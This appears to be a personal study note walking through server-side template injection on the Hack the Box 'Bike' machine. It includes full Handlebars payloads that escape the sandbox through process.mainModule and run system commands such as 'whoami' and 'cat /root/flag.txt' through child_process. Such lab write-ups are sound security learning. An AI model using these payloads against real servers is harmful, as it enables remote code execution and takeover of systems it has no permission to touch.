# [Server-side template injection](https://portswigger.net/research/server-side-template-injection)
> Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server. SSTI is an exploitation technique where the attacker injects native (to the Template Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code execution on the affected server. This attack is very common on `Node.js` websites.

## Contents: 
- [Template Engines](#template-engines)
- [Exploit: Via Burp Suite](#exploit-via-burp-suite)
- [Hack the Box: Bike](#hack-the-box-bike)
  - [Encode to URL](#encode-to-url)
  - [Problem](#problem)
  - [Solution](#solution)

## Template Engines
- You must first determine **_if_** you have a Template Engine.
- Template Engines are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client.
- Template Engines, like all software, are prone to vulnerabilities, like for example Server Side Template Injection (SSTI).
- Link: [Various exploitation techniques for various different template engines.](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- That site states: 

> Identifying the template engine involves analyzing error messages or manually testing various language-specific payloads. Common payloads causing errors include `${7/0}`, `{{7/0}}`, and `<%= 7/0 %>`. Observing the server's response to mathematical operations helps pinpoint the specific template engine.

## Exploit: Via Burp Suite
- Following the previous link to [hacktriks' SSTI how-to page.](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).. 
- Follow his testing inputs to find out if your target sitew is using a Template Engine, and then which one.
- He has several Engines with specific exploit code.

## Hack the Box: Bike
- I followed hacktriks'testing inputs and found out the target site is running Handlebars. 
- [Hacktriks has a write-up on exploiting Handlebars](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)
- His exploit code: 

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- NOTE THE LINE: `{{this.push "return require('child_process').exec('whoami');"}}`
- That line tests remote code execution with `whoami`

### Encode to URL
- Copy the above code and paste it into Burp's Decoder. Select `Encode as... URL`
- That should give you a long string of percent code. That's what we're going to use.

### Problem
- Start up Burp Suite. Turn on FoxyProxy. Use Burp's Proxy tab to capture a Submit from the website (anything will do). 
- Send the capture to Repeater... replace the text being sent via the Form with our URL encoded exploit.

![Pasted image 20240229203438](https://github.com/GregKedrovsky/Hacking/assets/26492233/2dd3fb4f-7035-4c22-8311-048575b3e692)

- This does not work right outta the box. We get an error: The response shows an error that states `require is not defined`.  
- `require` is a keyword in Node.js that is used to load code from other modules or files. The above code is attempting to load the Child Process module into memory and use it to execute system commands (in this case `whoami`).
- Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. 

### Solution
- Node.js may allow the [process object](https://nodejs.org/api/process.html#process) and if it does, we can use that to load the `require` module. Need to test it first with this code (encode to URL, paste into Repeater): 

```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process;"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

-  The line with `{{this.push "return process;"}}` should return `[object process]`. That indicates we can use this object.
- The `process` object has a [mainModule](https://nodejs.org/api/process.html#processmainmodule). It is deprecated, but it still might be available and useful ([blog post on the module](https://www.geeksforgeeks.org/node-js-process-mainmodule-property/)). 
- Test to see if the mainModule is accessible to us (encode to URL, paste into Repeater): 

```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule;"}}                #  this is the line
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

- There is no error. We get an `[object Object]` return that indicates it worked. Accessible.
- Try to get a system command to work (encode to URL, paste into Repeater): 

```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

- Line to watch: 
  `{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}`
- That should give you `root`
- Now just replace `whoami` with `ls /root` and you should see the flag file. Use `cat /root/flag.txt` in the line above (encode to URL, paste into Repeater). Should get it.
